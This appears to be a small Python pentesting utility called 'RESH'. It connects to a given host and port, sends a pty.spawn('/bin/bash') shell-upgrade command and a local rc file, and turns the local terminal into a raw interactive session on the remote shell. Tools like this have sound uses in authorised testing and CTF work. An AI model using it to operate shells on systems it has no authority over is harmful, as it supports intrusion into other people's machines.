#!/usr/bin/python3

import os
import socket
import sys
import termios
import threading
import tty

def setTTY():
	fd = sys.stdin.fileno()
	oldSet = termios.tcgetattr(fd)
	# os.system('stty raw -echo')
	tty.setraw(0)
	return fd, oldSet

def resetTTY(fd, oldSet):
	termios.tcsetattr(fd, termios.TCSADRAIN, oldSet)

def recvLoop(sock):
	while True:
		try:
			data = sock.recv(10000000)
		except OSError:
			return
		except Exception as e:
			print(e)
		if data == b'' or data == None:
			print('end\r\n')
			return
		data = data.decode()
		data = data.replace('\n', '\r\n')
		cprint(data)

def cprint(data):
	print(data, end='', flush=True)

def connect(host, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host, port))
	return sock

def rc(sock):
	rc_path = os.path.expanduser('~') + '/.reshrc'
	if os.path.exists(rc_path):
		with open(rc_path, 'rb') as fd:
			sock.send(fd.read())

print('''
██████╗░███████╗░██████╗██╗░░██╗
██╔══██╗██╔════╝██╔════╝██║░░██║
██████╔╝█████╗░░╚█████╗░███████║
██╔══██╗██╔══╝░░░╚═══██╗██╔══██║
██║░░██║███████╗██████╔╝██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝
''')
sock = connect(sys.argv[1], int(sys.argv[2]))

sock.send(b'export TERM=xterm\n')
sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
rc(sock)
fd, oldSet = setTTY()

thr = threading.Thread(target=recvLoop, args=(sock,))
thr.start()

while True:
	c = sys.stdin.read(1)
	if c == '\r':
		c = '\n'
	elif c == '²':
		sock.send(b'exit\n')
		resetTTY(fd, oldSet)
		break
	try:
		sock.send(c.encode())
	except BrokenPipeError:
		resetTTY(fd, oldSet)
		break

sock.close()
thr.join()
